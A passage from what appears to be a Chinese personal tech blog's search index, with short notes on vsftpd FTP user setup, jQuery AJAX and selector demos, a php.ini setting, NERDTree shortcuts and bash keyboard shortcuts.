pasv_min_port=30000</span><br><span class="line">pasv_max_port=30999</span><br><span class="line"> 　　　　 # firewall-cmd --zone=public --add-port=30000-30999/tcp --permanent //开启端口</span><br><span class="line">　　　　　# firewall-cmd --reload</span><br><span class="line">　　　　　# systemctl restart vsftpd.service //重启</span><br><span class="line">　　　　# useradd wuChuHeng -s /sbin/nologin //添加只能登录ftp服务的用户</span><br><span class="line">　　　　# passwd wuChuHeng //修改密码</span><br><span class="line">　　　(配置到当前已经可以使用帐号密码21端口登录在用户主目录了，如果想访问主目录上级，就将帐号一行一个加入chroot_list文件中)　</span><br><span class="line">　　　　# useradd -d /www/web/ -g ftp -s /sbin/nologin flash 指定目录指定用户</span><br><span class="line">　　　　#passwd falsh</span><br><span class="line">　　　　并将flash加入chroot_list,就可以限制在它的主目录中了。</span><br><span class="line">　　　　总结:最终实现的结果是，加入chroot_lis 名单，可以指定用户主目录，并限制在目录中，不在chroot_list名单中则没有这限制。</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>mySQL</tag>
        <tag>aparche</tag>
      </tags>
  </entry>
  <entry>
    <title>「前端」jQ学习笔记-ajax</title>
    <url>/2018/05/13/jQ%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ajax/</url>
    <content><![CDATA[<h2 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1.基本使用"></a>1.基本使用</h2><p> &emsp;说明:AJAX 是与服务器交换数据的一项技术，它可以在不重新加载整个网站的情况下更新网页的某部分。</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'demo1'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span> AJAX就是:<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>点击我你就知道<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'/library/static/js/jquery-2.1.4.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">charset</span>=<span class="string">'utf-8'</span>&gt;</span></span><br><span class="line">    $('.demo1 button').click(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url: '/library/static/html/demo/ajax.html',</span><br><span class="line">            type: 'GET',</span><br><span class="line">            data: &#123;'values1':1,'values2':2&#125;,</span><br><span class="line">            dataType: 'json',</span><br><span class="line">            success: function(result)&#123;</span><br><span class="line">                $('.demo1  span').append(result.msg);</span><br><span class="line">            &#125;,</span><br><span class="line">            error: function(result)&#123;</span><br><span class="line">                console.log(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:"></a>运行结果:</h2><p><div class="demo1"><br>    <span> AJAX就是:</span><br>    <button>点击我你就知道</button><br></div></p>
<script src="/library/static/js/jquery-2.1.4.js"></script>
<script type="text/javascript" charset="utf-8">
    $('.demo1 button').click(function(){
        $.ajax({
            url: '/library/static/html/demo/ajax.html',
            type: 'GET',
            data: {'values1':1,'values2':2},
            dataType: 'json',
            success: function(result){
                $('.demo1  span').append(result.msg);
            },
            error: function(result){
                console.log(result);
            }
        });
});
</script>

<p><strong>注:JSON对象格式</strong><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span> : <span class="string">"吴楚衡"</span>,</span><br><span class="line">    <span class="attr">"email"</span> : <span class="string">"wuchuheng@163.com"</span>,</span><br><span class="line">    <span class="attr">"github"</span> : <span class="string">"https://github.com/wuchuheng"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5qYjUxLm5ldC9hcnRpY2xlLzg5MDI4Lmh0bQ==" title="http://www.jb51.net/article/89028.htm">查看更多<i class="fa fa-external-link"></i></span></p>
<h2 id="2-表单提交"><a href="#2-表单提交" class="headerlink" title="2.表单提交"></a>2.表单提交</h2><p>&emsp;ajax提交表单，字面上的意思。使用ajax方式来提交表单。相对于非异步提交，ajax交换数据少，速度快，不闪屏的友好显示方式。一定程度提高浏览体验。</p>
<form action="/library/static/html/demo/ajax_form.html" method="get" enctype="multipart/form-data"><br><br><br></form>

]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>「前端」jQ学习笔记-选择器</title>
    <url>/2018/05/10/jQ%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%80%89%E6%8B%A9%E5%99%A8/</url>
    <content><![CDATA[<h2 id="多节点选中"><a href="#多节点选中" class="headerlink" title="多节点选中"></a>多节点选中</h2><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'/libery/static/js/jquery-3.3.1.min.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'demo1'</span>&gt;</span></span><br><span class="line">    输入框1:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">class</span>=<span class="string">'input1'</span> <span class="attr">value</span>=<span class="string">'输入框1'</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    输入框2:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">class</span>=<span class="string">'input2'</span> <span class="attr">value</span>=<span class="string">'输入框2'</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    输入框3:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">class</span>=<span class="string">'input3'</span> <span class="attr">value</span>=<span class="string">'输入框3'</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    根据选项框选中状态:<span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>1<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>2<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>3<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    选中单选的节点:</span><br><span class="line">        男:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'radio'</span> <span class="attr">name</span>=<span class="string">'sex'</span> <span class="attr">checked</span>=<span class="string">'checked'</span> <span class="attr">value</span>=<span class="string">'1'</span> /&gt;</span></span><br><span class="line">        女:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'radio'</span> <span class="attr">name</span>=<span class="string">'sex'</span> <span class="attr">value</span>=<span class="string">'0'</span> /&gt;</span></span><br><span class="line">        选中结果:<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">'result'</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>修改输入框1,3<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>修改全部输入框<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>选中框选中第3个选项<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">charset</span>=<span class="string">'utf-8'</span>&gt;</span></span><br><span class="line">    //节点选中</span><br><span class="line">    $('.demo1 button:first').click(function()&#123;</span><br><span class="line">        $('.input1,.input3').val('你已点击第一个按钮');</span><br><span class="line">    &#125;);</span><br><span class="line">    //子节点选中</span><br><span class="line">    $('.demo1 button').eq(1).click(function()&#123;</span><br><span class="line">        $(".demo1 input[type='text']").val('你已经点击第二个按钮');</span><br><span class="line">    &#125;);</span><br><span class="line">    //状态节点选中</span><br><span class="line">    $('.demo1 select').change(function()&#123;</span><br><span class="line">        var currentNode = $('.demo1 select option:selected');</span><br><span class="line">        currentNode.text('修改当前选中项');</span><br><span class="line">    &#125;);</span><br><span class="line">    //修改选中框选中状态</span><br><span class="line">    $('.demo1 button').eq(2).click(function()&#123;</span><br><span class="line">        $('.demo1 select option').attr('selected',true);</span><br><span class="line">    &#125;)</span><br><span class="line">    //选中单选的节点</span><br><span class="line">    $('.demo1 input[type=radio]').change(function()&#123;</span><br><span class="line">        var text = $('.demo1 input[type=radio]:checked').val();</span><br><span class="line">        $('.result').text(text);</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:  "></a>运行结果:  </h2><script src="/library/static/js/jquery-3.3.1.min.js"></script>
<div class="demo1">
    输入框1:<input type="text" class="input1" value="输入框1"><br>
    输入框2:<input type="text" class="input2" value="输入框2"><br>
    输入框3:<input type="text" class="input3" value="输入框3"><br>
    根据选项框选中状态:<select>
        <option>1
        </option><option>2
        </option><option>3
    </option></select><br>
    选中单选的节点:
        男:<input type="radio" name="sex" checked="checked" value="1">
        女:<input type="radio" name="sex" value="0">
        选中结果:<span class="result"></span>
    <br>
    <button>修改输入框1,3</button>
    <button>修改全部输入框</button>
    <button>选中框选中第3个选项</button>
</div>
<script type="text/javascript" charset="utf-8">
    //节点选中
    $('.demo1 button:first').click(function(){
        $('.input1,.input3').val('你已点击第一个按钮');
    });
    //子节点选中
    $('.demo1 button').eq(1).click(function(){
        $(".demo1 input[type='text']").val('你已经点击第二个按钮');
    });
    //状态节点选中
    $('.demo1 select').change(function(){
        var currentNode = $('.demo1 select option:selected');
        currentNode.text('修改当前选中项');
    });
    //修改选中框选中状态
    $('.demo1 button').eq(2).click(function(){
        $('.demo1 select option').attr('selected',true);
    })
    //选中单选的节点
    $('.demo1 input[type=radio]').change(function(){
        var text = $('.demo1 input[type=radio]:checked').val();
        $('.result').text(text);
    })
</script>




]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」php.ini配置说明</title>
    <url>/2018/05/10/php-ini%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<ul>
<li><code>display_errors = On</code>开启php错误信息</li>
</ul>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>「linux」Nerdtree常用快捷键</title>
    <url>/2018/05/02/Nerdtree%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<h4 id="打开文件或目录"><a href="#打开文件或目录" class="headerlink" title="打开文件或目录"></a>打开文件或目录</h4><ul>
<li><code>o</code> : 打开一个目录或一个文件并fouce在这个文件。已在buffer中就fouce。</li>
<li><code>go</code> : fouce在nerdtree打开一个文件。如，多个窗口，文件打开在上-个fouce的窗口。</li>
<li><code>t</code> : 在新的Tab打开一个文件并fouce在这个文件。</li>
<li><code>T</code> :在新的Tab打开一个文件。fouce留在Nerdtree。</li>
<li><code>i</code> :水平分割打开文件。并fouce到当前的文件。</li>
<li><code>gi</code> :水平分割打开文件。fouce在Nerdtree。</li>
<li><code>s</code> :垂直分割打开文件。同上。</li>
<li><code>gs</code> :同上。<a id="more"></a></li>
<li><code>O</code> :递归显示目录下的所有文件。</li>
</ul>
<!--more-->
<h4 id="Nerdtree移动光标快捷键"><a href="#Nerdtree移动光标快捷键" class="headerlink" title="Nerdtree移动光标快捷键"></a>Nerdtree移动光标快捷键</h4><ul>
<li><code>P</code> :fouce到当前Nerdtree的根目录。</li>
<li><code>p</code> :fouce到当前目录的父节点。</li>
<li><code>K</code> :fouce到同级第一个节点。</li>
<li><code>J</code> :同上相反。</li>
<li><code>C-j</code> :fouce到下一个同级节点。</li>
<li><code>C-k</code> :fouce到上一个同级节点。  </li>
</ul>
<h4 id="其它操作"><a href="#其它操作" class="headerlink" title="其它操作"></a>其它操作</h4><ul>
<li><code>r</code> :刷新光标所在的目录。</li>
<li><code>R</code> :刷新根目录。</li>
<li><code>I</code> :显示或不显示隐藏文件。</li>
<li><code>A</code> :全屏显示或不显示Nerdtree目录。</li>
<li><code>u</code> :将root根目录的上一级作为根目录。并合并子节点。</li>
<li><code>U</code> :将root根目录的上一级作为根目录。并不合并子节点。</li>
<li><code>C</code> :将当前目录作为根</li>
<li><code>A</code> :全屏Nerdtree目录或关闭全屏Nerdtree目录。</li>
<li><code>X</code> :递归合拢子目录为一级目录。</li>
<li><code>x</code> :当前目录合拢为父目录。</li>
<li><code>m</code> :文件操作菜单。</li>
<li><code>C-n</code> :fouce到Nerdtree目录并递归合并子目录。</li>
<li><code>F</code> :是否显示文件。</li>
<li><code>q</code> :关闭Nerdtree目录。</li>
<li><code>gt</code> :下一个标签页面。</li>
<li><code>gT</code> :同上相反。</li>
<li><code>?</code> :查看帮助文档。  </li>
</ul>
<h4 id="Nerdtree配置"><a href="#Nerdtree配置" class="headerlink" title="Nerdtree配置"></a>Nerdtree配置</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&quot;Plugin &apos;scrooloose/nerdtree&apos; //安装nerdtree插件</span><br><span class="line"> let NERDTreeShowLineNumbers=1 &quot; 显示行号</span><br><span class="line"> let NERDTreeAutoCenter=1</span><br><span class="line"> &quot;在 vim 启动的时候默认开启 NERDTree（autocmd 可以缩写为 au）</span><br><span class="line"> autocmd VimEnter * NERDTree</span><br><span class="line"> &quot; 按下 F2 调出/隐藏 NERDTree</span><br><span class="line"> map  &lt;F2&gt; :NERDTreeToggle&lt;CR&gt;</span><br><span class="line"> map &lt;C-n&gt; :NERDTree&lt;CR&gt;</span><br><span class="line"> &quot; 将 NERDTree 的窗口设置在 vim 窗口的右侧（默认为左侧）</span><br><span class="line"> &quot;let NERDTreeWinPos=&quot;left&quot;</span><br><span class="line"> &quot; 当打开 NERDTree 窗口时，自动显示 Bookmarks</span><br><span class="line"> let NERDTreeShowBookmarks=1</span><br><span class="line"> let g:NERDTreeShowHidden = 1             &quot;显示隐藏文件</span><br><span class="line"> &quot;默认打开定位至编辑区</span><br><span class="line">autocmd VimEnter * NERDTree</span><br><span class="line">wincmd w</span><br><span class="line">autocmd VimEnter * wincmd w</span><br><span class="line">&quot; 光标到上方窗口,需要&lt;c-w&gt;&lt;c-w&gt;k,非常麻烦,现在重映射为&lt;c-k&gt;</span><br><span class="line"> nnoremap &lt;C-h&gt; &lt;C-w&gt;h</span><br><span class="line"> nnoremap &lt;C-j&gt; &lt;C-w&gt;j</span><br><span class="line"> nnoremap &lt;C-k&gt; &lt;C-w&gt;k</span><br><span class="line"> nnoremap &lt;C-l&gt; &lt;C-w&gt;l</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>「linux」shell常用快捷键</title>
    <url>/2018/05/01/shell%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<h4 id="进入vi编辑模式"><a href="#进入vi编辑模式" class="headerlink" title="进入vi编辑模式"></a>进入vi编辑模式</h4><p><strong><em><code>set -o vi</code></em></strong> 可以使用vi的方法来编辑当前行命令。<code>esc</code>退出vi回到bash</p>
<h4 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h4><table>
<thead>
<tr>
<th style="text-align:center">方向</th>
<th style="text-align:center">效果</th>
<th style="text-align:center">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">往右</td>
<td style="text-align:center">向右移动一字符</td>
<td style="text-align:center">ctr+f</td>
</tr>
<tr>
<td style="text-align:center">往右</td>
<td style="text-align:center">向右移动一单词</td>
<td style="text-align:center">alt+f</td>
</tr>
<tr>
<td style="text-align:center">往右</td>
<td style="text-align:center">向右移动行尾</td>
<td style="text-align:center">ctr+e</td>
</tr>
<tr>
<td style="text-align:center">中间</td>
<td style="text-align:center">移动到行间</td>
<td style="text-align:center">(待添加)</td>
</tr>
<tr>
<td style="text-align:center">往左</td>
<td style="text-align:center">向左移动一字符</td>
<td style="text-align:center">ctr+b</td>
</tr>
<tr>
<td style="text-align:center">往左</td>
<td style="text-align:center">向左移动一单词</td>
<td style="text-align:center">alt+b</td>
</tr>
<tr>
<td style="text-align:center">往左</td>
<td style="text-align:center">向左移动行首</td>
<td style="text-align:center">ctr+a</td>
</tr>
</tbody>
</table>
<a id="more"></a>
<h4 id="删除字符"><a href="#删除字符" class="headerlink" title="删除字符"></a>删除字符</h4><table>
<thead>
<tr>
<th style="text-align:center">方向</th>
<th style="text-align:center">效果</th>
<th style="text-align:center">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">往右</td>
<td style="text-align:center">向右删除一字符</td>
<td style="text-align:center">ctr+d</td>
</tr>
<tr>
<td style="text-align:center">往右</td>
<td style="text-align:center">向右删除一单词</td>
<td style="text-align:center">alt+d</td>
</tr>
<tr>
<td style="text-align:center">往右</td>
<td style="text-align:center">向右删除到行尾</td>
<td style="text-align:center">ctr+k</td>
</tr>
<tr>
<td style="text-align:center">中间</td>
<td style="text-align:center">删除到行间</td>
<td style="text-align:center">(待添加)</td>
</tr>
<tr>
<td style="text-align:center">往左</td>
<td style="text-align:center">向左删除一字符</td>
<td style="text-align:center">ctr+h</td>
</tr>
<tr>
<td style="text-align:center">往左</td>
<td style="text-align:center">向左删除一单词</td>
<td style="text-align:center">alt+w</td>
</tr>
<tr>
<td style="text-align:center">往左</td>
<td style="text-align:center">向左删除行首</td>
<td style="text-align:center">ctr+u</td>
</tr>
</tbody>
</table>
<h4 id="粘贴"><a href="#粘贴" class="headerlink" title="粘贴"></a>粘贴</h4><table>
<thead>
<tr>
<th style="text-align:center">效果</th>
<th style="text-align:center">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">粘贴</td>
<td style="text-align:center">ctr+y</td>
</tr>
</tbody>
</table>
<p>注:粘贴是删除的内容，没有以上的删除操作是粘贴不了的。</p>
<h4 id="历史输入"><a href="#历史输入" class="headerlink" title="历史输入"></a>历史输入</h4><table>
<thead>
<tr>
<th style="text-align:center">效果</th>
<th style="text-align:center">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">上一条命令</td>
<td style="text-align:center">ctr+p</td>
</tr>
<tr>
<td style="text-align:center">下一条命令</td>
<td style="text-align:center">ctr+n</td>
</tr>
<tr>
<td style="text-align:center">第n条命令</td>
<td style="text-align:center"><code>!n</code></td>
</tr>
<tr>
<td style="text-align:center">倒数第n条命令</td>
<td style="text-align:center"><code>!-n</code></td>
</tr>
<tr>
<td style="text-align:center">上一条命令的第一个参数</td>
<td style="text-align:center"><code>!:1</code>或<code>!:^</code></td>
</tr>
<tr>
<td style="text-align:center">上一条命令的最后一个参数</td>
<td style="text-align:center"><code>!:$</code>或<code>!$</code></td>
</tr>
<tr>
<td style="text-align:center">第n个命令的第n个参数</td>
<td style="text-align:center"><code>!n:n</code></td>
</tr>
<tr>
<td style="text-align:center">最后一条历史</td>
<td style="text-align:center">ctr+j</td>
</tr>
<tr>
<td style="text-align:center">搜索</td>
<td style="text-align:center">ctr+r(输入关键字)</td>
</tr>
<tr>
<td style="text-align:center">退出搜索</td>
<td style="text-align:center">ctr+g或esc</td>
</tr>
</tbody>
</table>
<h4 id="清空屏幕"><a href="#清空屏幕" class="headerlink" title="清空屏幕"></a>清空屏幕</h4><table>
<thead>
<tr>
<th style="text-align:center">效果</th>
<th style="text-align:center">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">清空屏幕</td>
<td style="text-align:center">ctr+l 或 <code>clear</code></td>
</tr>
</tbody>
</table>
<h4 id="停止当前执行中程序"><a href="#停止当前执行中程序" class="headerlink" title="停止当前执行中程序"></a>停止当前执行中程序</h4><table>
<thead>
<tr>
<th style="text-align:center">效果</th>
<th style="text-align:center">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">停止执行并退出</td>
<td style="text-align:center">ctr+c</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
</search>
